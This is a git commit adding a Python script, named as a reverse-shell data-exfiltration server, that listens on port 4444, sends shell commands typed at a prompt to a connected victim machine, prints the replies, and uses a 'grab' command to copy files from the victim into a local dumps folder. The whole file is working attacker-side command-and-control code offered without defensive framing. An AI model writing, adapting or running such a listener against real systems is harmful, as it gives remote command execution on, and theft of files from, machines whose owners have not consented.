136293a88589117e44fc28a8959f16f82d73161b
fr0stNuLL <49701399+frostnull@users.noreply.github.com>
2019-10-08 22:31:25 -0300

    Create TCP-reverse-shell-data-exfiltration-server.py

---
+++ TCP-reverse-shell-data-exfiltration-server.py
@@ -0,0 +1,54 @@
+import socket,os
+
+IP = '127.0.0.1'
+PORT = 4444
+
+
+def transfer(conn, command):
+    path_save = os.getcwd()
+    conn.send(command.encode())
+    grab, path = command.split("*")
+    f = open(path_save+"/dumps/"+path, 'wb')
+    while True:
+        bits = conn.recv(1024)
+        if bits.endswith('DONE'.encode()):
+            f.write(bits[:-4]) # Write those last received bits without the word 'DONE' 
+            f.close()
+            print ('[+] Transfer completed ')
+            break
+        if 'File not found'.encode() in bits:
+            print ('[-] Unable to find out the file')
+            break
+        f.write(bits)
+
+
+def connect():
+    s = socket.socket()
+    s.bind((IP,PORT))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(f"GOT: {conn}:{addr}")
+    while True:
+        command = input("$Shell>> ")
+
+        if command == "":
+            command = "id"
+            conn.send(command.encode())
+            print(f"Data GOT: {conn.recv(1024).decode()}")
+
+        if 'terminate' in command:
+            conn.send('terminate'.encode())
+            conn.close()
+            break #exit while
+        elif 'grab' in command:
+            transfer(conn, command)
+        else: 
+            conn.send(command.encode())
+            print(f"Data GOT: {conn.recv(1024).decode()}")
+
+def main():
+    connect()
+
+
+if __name__ == "__main__":
+    main()
